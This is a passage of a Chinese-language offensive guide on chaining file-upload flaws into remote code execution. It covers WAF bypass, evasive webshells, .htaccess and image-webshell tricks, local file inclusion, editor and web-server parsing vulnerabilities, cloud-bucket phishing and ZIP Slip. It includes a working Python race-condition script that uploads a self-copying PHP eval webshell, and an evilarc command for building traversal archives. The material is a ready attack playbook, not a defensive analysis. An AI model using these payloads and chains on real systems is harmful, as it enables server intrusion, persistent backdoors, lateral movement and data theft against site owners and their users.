## 五、组合利用链

### 5.1 标准上传RCE链
```
1. 探测上传点 → 确定防护层
2. 绕过扩展名/MIME检测 → 使用策略1/3
3. 若被WAF拦截 → 使用策略9流量层绕过
4. 若内容被查杀 → 使用策略11免杀WebShell
5. 上传成功 → 获取访问路径
6. 连接WebShell → Godzilla/菜刀/冰蝎
7. 提权/信息收集/横向移动
```

### 5.2 配置文件上传链（无法直接上传.php）
```
1. 绕过检测上传.htaccess/.user.ini → 需绕过后缀黑名单
2. 上传图片马shell.gif（GIF89a+PHP代码）
3. 访问触发解析
4. 获取Shell
```

### 5.3 文件包含+上传组合链
```
1. 上传内容为<?php code?>的.jpg（白名单允许图片）
2. 找到文件包含点（LFI）
3. ?file=upload/shell.jpg → 包含执行
4. 配合php://filter/base64读取源码
```

### 5.4 编辑器漏洞链
```
1. 识别编辑器类型（CKEditor/UEditor/KindEditor/eWebEditor）
2. 利用编辑器历史漏洞直接上传Shell
   - UEditor .NET版本任意文件上传
   - CKEditor文件管理器漏洞
   - KindEditor上传漏洞
   - FCKeditor connector上传
3. 或编辑器配置不当允许上传.aspx/.php
```

### 5.5 解析漏洞组合链
```
IIS 6.0:
  - /test.asp/1.jpg → test.asp作为脚本执行
  - shell.asp;.jpg → 分号截断解析为asp
  - PUT + MOVE → 通过WebDAV上传txt后MOVE为asp

Nginx:
  - shell.jpg/.php → 老版本解析为php
  - CVE-2013-4547: shell.jpg%00.php → 空字节截断
  - CVE-2017-15715(Apache): shell.php%0a → 换行绕过

Apache:
  - 多扩展名解析 shell.php.jpg
  - CRLF注入绕过
  - .htaccess配置文件上传
```

### 5.6 竞争条件链（文件上传后立即删除）
```python
import requests
import threading

def upload():
    files = {'file': ('shell.php', '<?php eval($_POST["cmd"]);fwrite(fopen("shell.php","w"),"<?php eval(\\"$_POST[cmd]\\");?>");?>')}
    requests.post('http://target.com/upload', files=files)

def access():
    while True:
        r = requests.get('http://target.com/uploads/shell.php')
        if r.status_code == 200:
            print("[+] Shell保留成功")
            break

for i in range(10):
    threading.Thread(target=upload).start()
    threading.Thread(target=access).start()
```

### 5.7 云存储利用链
```
1. 阿里云OSS直传签名泄露 → 覆盖任意文件
2. AWS S3 Bucket公开写权限 → 直接上传HTML/JS（钓鱼/XSS）
3. OSS Bucket配置为静态网站 → 上传HTML做钓鱼
4. 若云存储绑定到目标域名 → 上传HTML实现同域XSS
```

### 5.8 ZIP Slip路径穿越（上传+解压）
```
1. 构造ZIP文件，内含路径穿越文件
   文件名：../../../../var/www/html/shell.php
2. 上传ZIP到自动解压功能
3. 解压时文件穿越到Web目录
4. 访问Shell

ZIP工具构造：
使用python zipfile或evilarc
python evilarc.py -o unix -p /var/www/html/ shell.php
```

